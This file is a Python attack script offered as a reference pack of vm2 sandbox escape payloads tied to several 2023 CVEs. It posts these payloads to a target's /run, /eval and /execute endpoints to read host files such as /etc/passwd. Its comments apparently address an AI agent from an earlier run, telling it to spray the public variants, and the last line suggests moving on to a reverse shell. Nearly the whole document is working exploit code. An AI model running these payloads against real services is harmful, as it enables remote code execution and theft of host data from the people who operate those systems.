#!/usr/bin/env python3
# [REFERENCE] nodejs vm2 sandbox escape pack — the public escape families for
# vm2 <= 3.9.19 (final EOL) plus the host-leak primitives below full escape.
# When a web service evaluates user JS under vm2, DON'T re-derive the escape
# from first principles offline (run 43633 e2-04: the agent burned 4 passes
# rebuilding vm2 locally with no npm access) — spray these public variants.
# Public lineage: saxontech/promise-reject (CVE-2023-30547), xm1k/iso2022js
# vm2-escape chain repo, official vm2 advisories GHSA-p5gc-c584-jgw6 (29199/
# 29223), GHSA-fvf8-... (32314), GHSA-mr93-... (37903/37466).
# Fingerprint: a JS-eval playground whose errors mention "VM2", "vm.js",
# "Sandbox", or whose stack traces get truncated at sandbox boundaries;
# Node + vm2 services usually expose /run /eval /execute with {code}.
# Usage: python3 vm2-sandbox-escape-pack.py http://TARGET:PORT [/read /etc/passwd]
import json, sys, urllib3, requests
urllib3.disable_warnings()

BASE = sys.argv[1].rstrip('/') if len(sys.argv) > 1 else "http://localhost:3000"
OUT = sys.argv[2] if len(sys.argv) > 2 else "/etc/passwd"
TIMEOUT = 15

# Each variant: full standalone JS. Escape = run host code; leak = read host
# data via error/stack channels when full RCE is patched.
VARIANTS = {
    # CVE-2023-30547: Promise rejection handler receives a HOST Error object
    # whose .stack getter runs unsanitized host code on property access.
    "cve-2023-30547-err-stack": """
const handler = { getPrototypeOf(target) { throw new Error(); } };
const proxy = new Proxy({}, handler);
try { Object.setPrototypeOf({}, proxy); } catch (e) {
    const f = e.constructor.constructor; // host Function via unsanitized Error
    const out = f('return process.mainModule.require("fs").readFileSync("%s","utf8")')();
    throw new Error("EXFIL::" + out);
}
""" % OUT,
    # CVE-2023-29197 / 37903 family: util.inspect calls host toString/custom
    # inspect OUTSIDE the sandbox (inspect depth on a hostile object).
    "cve-2023-37903-custom-inspect": """
const evil = { [Symbol.for('nodejs.util.inspect.custom')]: function(depth, opts) {
    const f = this.constructor.constructor; // host Function
    return f('return process.mainModule.require("fs").readFileSync("%s","utf8")')();
}};
console.log({x: evil});
""" % OUT,
    # CVE-2023-32314: Proxy trap invoked by host-side error serialization.
    "cve-2023-32314-prepareStackTrace": """
Error.prepareStackTrace = function(e, frames) {
    const hostFn = frames[0].getFunction().constructor; // host realm Function
    return hostFn('return process.mainModule.require("fs").readFileSync("%s","utf8")')();
};
new Error().stack;
""" % OUT,
    # Classic async leak: unhandled rejection carries the host frame source
    # into the sandbox response (read-only primitive — pivot from the leaked
    # host source to the real escape).
    "host-stack-leak": """
Promise.reject(new Error('leak')).catch(()=>{});
(async () => { await null; throw new Error('probe'); })();
""",
    # Host exception smuggling: exceptions thrown BY host builtins cross the
    # bridge with host prototype intact on many vm2 configs.
    "host-exception-proto": """
try { null.x; } catch (e) {
    const f = Object.getPrototypeOf(e).constructor.constructor;
    throw new Error("EXFIL::" + f('return process.mainModule.require("fs").readFileSync("%s","utf8")')());
}
""" % OUT,
}

def submit(code):
    for path, field in (("/run", "code"), ("/eval", "code"), ("/execute", "code"), ("/api/run", "code"), ("/run", "script")):
        try:
            r = requests.post(BASE + path, json={field: code, "code": code, "script": code}, timeout=TIMEOUT)
            if r.status_code != 404:
                return path, r
        except Exception:
            continue
    return None, None

print(f"[*] vm2 escape spray against {BASE}, read target {OUT}")
for name, code in VARIANTS.items():
    path, r = submit(code)
    if r is None:
        print(f"[!] no eval route found — map the service routes first")
        break
    body = r.text[:400]
    hit = "EXFIL::" in r.text or "root:" in r.text or "flag{" in r.text.lower()
    print(f"[{'+' if hit else '-'}] {name} via {path} ({r.status_code}): {body[:200]}")
    if hit:
        print("[=] ESCAPE CONFIRMED — swap the fs target for the flag path / reverse shell")
        break
